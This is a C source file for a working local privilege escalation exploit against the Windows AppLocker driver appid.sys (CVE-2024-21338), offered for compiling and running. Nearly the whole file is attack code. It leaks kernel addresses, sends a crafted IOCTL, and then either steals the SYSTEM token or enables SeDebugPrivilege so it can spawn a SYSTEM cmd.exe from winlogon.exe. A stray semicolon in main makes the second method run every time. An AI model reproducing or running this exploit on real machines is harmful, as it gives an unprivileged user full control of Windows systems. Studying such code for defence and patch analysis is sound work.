﻿/*
Exploit title:      Windows AppLocker Driver (appid.sys) LPE
Exploit Author:     Bùi Quang Hiếu
CVE:				CVE-2024-21338
Category:           local exploit
Platform:           windows
Usage:              Compile and run this exploit on a machine where a vulnerable version of the appid.sys driver is present
*/
#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <ntstatus.h>
#include <TlHelp32.h>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(*pNtWriteVirtualMemory)(
	IN HANDLE               ProcessHandle,
	IN PVOID                BaseAddress,
	IN PVOID                Buffer,
	IN ULONG                NumberOfBytesToWrite,
	OUT PULONG              NumberOfBytesWritten OPTIONAL
	);

typedef NTSTATUS(*pNtReadVirtualMemory)(
	IN HANDLE               ProcessHandle,
	IN PVOID                BaseAddress,
	OUT PVOID               Buffer,
	IN ULONG                NumberOfBytesToRead,
	OUT PULONG              NumberOfBytesReaded OPTIONAL
	);

typedef struct _HASH_IMAGE_FILE {
	ULONGLONG ImageContext;
	PVOID FileObject;
	PVOID CallbackTable;
	ULONGLONG Action;               // not so sure  
} HASH_IMAGE_FILE, * PHASH_IMAGE_FILE;

// common offsets
#define OFFSET_PID 0x440
#define OFFSET_PROCESS_LINKS 0x448
#define OFFSET_TOKEN 0x4b8
#define OFFSET_KPROCESS 0x220
#define OFFSET_PREVIOUS_MODE 0x232
#define OFFSET_PRIVILEGES 0x40

// offset of DbgkpTriageDumpRestoreState
#define OFFSET_GADGET_WIN11 0x7f06e0
ULONGLONG pFileObject;
HANDLE hDev;

//
// some helpful functions and structures
// https://github.com/bluefrostsecurity/CVE-2019-1215/blob/master/CVE-2019-1215-ws2ifsl/exploit.cpp
//

#define MAXIMUM_FILENAME_LENGTH 255 
#define SystemModuleInformation  0xb
#define SystemHandleInformation 0x10

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	ULONG ProcessId;
	UCHAR ObjectTypeNumber;
	UCHAR Flags;
	USHORT Handle;
	void* Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

HMODULE GetNOSModule()
{
	HMODULE hKern = 0;
	hKern = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	return hKern;
}

DWORD64 GetModuleAddr(const char* modName)
{
	PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);

	DWORD outBuffer = 0;
	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, 0x20, &outBuffer);

	if (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		free(buffer);
		buffer = (PSYSTEM_MODULE_INFORMATION)malloc(outBuffer);
		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, outBuffer, &outBuffer);
	}

	if (!buffer)
	{
		printf("[-] NtQuerySystemInformation error\n");
		return 0;
	}

	for (unsigned int i = 0; i < buffer->ModulesCount; i++)
	{
		PVOID kernelImageBase = buffer->Modules[i].ImageBaseAddress;
		PCHAR kernelImage = (PCHAR)buffer->Modules[i].Name;
		if (_stricmp(kernelImage, modName) == 0)
		{
			free(buffer);
			return (DWORD64)kernelImageBase;
		}
	}
	free(buffer);
	return 0;
}


DWORD64 GetKernelPointer(HANDLE handle, DWORD type)
{
	PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);

	DWORD outBuffer = 0;
	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);

	if (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		free(buffer);
		buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
	}

	if (!buffer)
	{
		printf("[-] NtQuerySystemInformation error \n");
		return 0;
	}

	ULONG CurrentId = GetCurrentProcessId();
	for (size_t i = 0; i < buffer->NumberOfHandles; i++)
	{
		DWORD objTypeNumber = buffer->Handles[i].ObjectTypeNumber;

		if (buffer->Handles[i].ProcessId == CurrentId && handle == (HANDLE)buffer->Handles[i].Handle)
		{
			//printf("%p %d %x\n", buffer->Handles[i].Object, buffer->Handles[i].ObjectTypeNumber, buffer->Handles[i].Handle);
			DWORD64 object = (DWORD64)buffer->Handles[i].Object;
			free(buffer);
			return object;
		}
	}
	printf("[-] handle not found\n");
	free(buffer);
	return 0;
}

DWORD64 GetGadgetAddr(const char* name)
{
	DWORD64 base = GetModuleAddr("\\SystemRoot\\system32\\ntoskrnl.exe");
	HMODULE mod = GetNOSModule();
	if (!mod)
	{
		printf("[-] leaking ntoskrnl version\n");
		return 0;
	}
	DWORD64 offset = (DWORD64)GetProcAddress(mod, name);

	DWORD64 returnValue = base + offset - (DWORD64)mod;
	FreeLibrary(mod);
	return returnValue;
}

/// 
/// 
/// 
pNtWriteVirtualMemory NtWriteVirtualMemory;
pNtReadVirtualMemory NtReadVirtualMemory;
ULONGLONG kThreadAddr;
BOOL StartWork = FALSE;

void ThreadWorker() {
	while (!StartWork)
		Sleep(1000);

	printf("[!] Start work!\n");

	ULONGLONG Buffer;
	NTSTATUS status;
	HANDLE hProc = GetCurrentProcess();

	status = NtReadVirtualMemory(hProc, (PVOID)(kThreadAddr + OFFSET_KPROCESS), &Buffer, 8, 0);

	printf("[+] Current process: 0x%llx\n", Buffer);
	ULONGLONG CurrentProc = Buffer;

	ULONGLONG pLinks = 0;
	ULONGLONG pid = -1;
	while (pid != 4) {
		NtReadVirtualMemory(hProc, (PVOID)(Buffer + OFFSET_PROCESS_LINKS), &pLinks, 8, 0);
		Buffer = pLinks - OFFSET_PROCESS_LINKS;
		NtReadVirtualMemory(hProc, (PVOID)(Buffer + OFFSET_PID), &pid, 8, 0);
	}

	ULONGLONG SystemProc = Buffer;
	ULONGLONG SystemToken;
	NtReadVirtualMemory(hProc, (PVOID)(SystemProc + OFFSET_TOKEN), &SystemToken, 8, 0);
	printf("[+] Found System process: 0x%llx, token: 0x%llx\n", Buffer, SystemToken);

	printf("[!] Writing current process token with system's token!\n");
	NtWriteVirtualMemory(hProc, (PVOID)(CurrentProc + OFFSET_TOKEN), &SystemToken, 8, 0);

	printf("[!] Restoring original value...\n");
	ULONGLONG original_value = 0x801; // base priority = 8 && previous_mode = 1
	NtWriteVirtualMemory(hProc, (PVOID)(kThreadAddr + OFFSET_PREVIOUS_MODE), &original_value, 8, 0);

	printf("[!] Starting new shell...\n");
	system("cmd.exe");
}

BOOL Exploit_PreviousMode() {
	HMODULE ntdll = GetModuleHandleA("ntdll");
	NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");

	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ThreadWorker, 0, 0, 0);
	kThreadAddr = GetKernelPointer(hThread, 8);

	printf("[+] _KTHREAD = 0x%llx\n", kThreadAddr);
	if (!kThreadAddr)
		return FALSE;

	// last bytes is zero
	ULONGLONG* CbTbl = (ULONGLONG*)VirtualAlloc((VOID*)0x100000, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	CbTbl[0] = GetModuleAddr("\\SystemRoot\\system32\\ntoskrnl.exe") + OFFSET_GADGET_WIN11;
	CbTbl[1] = GetGadgetAddr("HalDisplayString");

	HASH_IMAGE_FILE* DataStruct = (HASH_IMAGE_FILE*)VirtualAlloc(0, sizeof(HASH_IMAGE_FILE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DataStruct->ImageContext = kThreadAddr + OFFSET_PREVIOUS_MODE - 0x2078;
	DataStruct->FileObject = (PVOID)pFileObject;
	DataStruct->CallbackTable = CbTbl;

	printf("[!] Triggering vuln...\n");
	DWORD RetBytes;
	NTSTATUS status = DeviceIoControl(hDev, 0x22A018, DataStruct, sizeof(HASH_IMAGE_FILE), 0, 0, &RetBytes, 0);

	if (status == STATUS_SUCCESS || status == STATUS_WAIT_1) {
		printf("[+] Successfully overwrite PreviousMode of worker thread!\n");
		StartWork = TRUE;
	}

	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}

///
/// 
///
/// 
ULONG GetPidByName(const wchar_t* procname) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	ULONG pid;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (wcscmp(entry.szExeFile, procname) == 0)
			{
				pid = entry.th32ProcessID;
				break;
			}
		}
	}

	CloseHandle(snapshot);
	return pid;
}

//
// original from https://gist.github.com/xpn/a057a26ec81e736518ee50848b9c2cd6
//
DWORD CreateProcessFromHandle(HANDLE Handle, LPSTR command) {
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T size;
	BOOL ret;

	// Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));

	InitializeProcThreadAttributeList(NULL, 1, 0, &size);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(),
		0,
		size
	);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &Handle, sizeof(HANDLE), NULL, NULL);

	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	// Finally, create the process
	ret = CreateProcessA(
		NULL,
		command,
		NULL,
		NULL,
		true,
		EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		reinterpret_cast<LPSTARTUPINFOA>(&si),
		&pi
	);

	if (ret == false) {
		printf("Error creating new process (%d)\n", GetLastError());
		return 3;
	}

	printf("Enjoy your new SYSTEM process\n");
	return 0;
}

BOOL Exploit_SebugPrivilege() {
	HANDLE hToken;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);

	ULONGLONG kTokenAddr = GetKernelPointer(hToken, 7);
	CloseHandle(hToken);
	printf("[+] _TOKEN = 0x%llx\n", kTokenAddr);

	if (!kTokenAddr)
		return FALSE;

	// 0x100000 meaning 20th bit is enabled == SeDebugPrivilege
	ULONGLONG* CbTbl = (ULONGLONG*)VirtualAlloc((VOID*)0x100000, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	CbTbl[0] = GetModuleAddr("\\SystemRoot\\system32\\ntoskrnl.exe") + OFFSET_GADGET_WIN11;
	CbTbl[1] = GetGadgetAddr("HalDisplayString");

	HASH_IMAGE_FILE* DataStruct = (HASH_IMAGE_FILE*)VirtualAlloc(0, sizeof(HASH_IMAGE_FILE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DataStruct->ImageContext = kTokenAddr + OFFSET_PRIVILEGES - 0x2078;
	DataStruct->FileObject = (PVOID)pFileObject;
	DataStruct->CallbackTable = CbTbl;

	printf("[!] Triggering vuln...\n");
	DWORD RetBytes;
	NTSTATUS status = DeviceIoControl(hDev, 0x22A018, DataStruct, sizeof(HASH_IMAGE_FILE), 0, 0, &RetBytes, 0);

	if (status == STATUS_SUCCESS || status == STATUS_WAIT_1)
		printf("[+] SeDebugPrivilege set!\n");

	DataStruct->ImageContext += 8;
	status = DeviceIoControl(hDev, 0x22A018, DataStruct, sizeof(HASH_IMAGE_FILE), 0, 0, &RetBytes, 0);
	if (status == STATUS_SUCCESS || status == STATUS_WAIT_1)
		printf("[+] SeDebugPrivilege enabled!\n");

	HANDLE hWinLogon = OpenProcess(PROCESS_ALL_ACCESS, 0, GetPidByName(L"winlogon.exe"));
	if (!hWinLogon) {
		printf("OpenProcess failed, GLE = 0x%lx\n", GetLastError());
		return FALSE;
	}

	CreateProcessFromHandle(hWinLogon, (LPSTR)"cmd.exe");

	return TRUE;
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		printf("USAGE: %s 1|2\n", argv[0]);
		return 0;
	}


	HANDLE hFile = CreateFileA("temp.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (!hFile) {
		printf("Something was wrong here, GLE = 0x%lx\n", GetLastError());
	}
	pFileObject = GetKernelPointer(hFile, 37);
	printf("[+] pFileObject = 0x%llx\n", pFileObject);

	hDev = CreateFileA("\\\\.\\GLOBALROOT\\Device\\AppId",
		GENERIC_READ | GENERIC_WRITE,
		0,
		0,
		OPEN_EXISTING,
		0,
		0);

	if (hDev == INVALID_HANDLE_VALUE) {
		printf("[-] Open device failed, GLE = %d\n", GetLastError());
		return -1;
	}
	printf("[+] Device handle value: %d\n", hDev);

	int c = atoi(argv[1]);
	if (c == 1)
		Exploit_PreviousMode();
	else if (c == 2);
	Exploit_SebugPrivilege();

	CloseHandle(hFile);
	CloseHandle(hDev);
	DeleteFileA("temp.txt");

	return 0;
}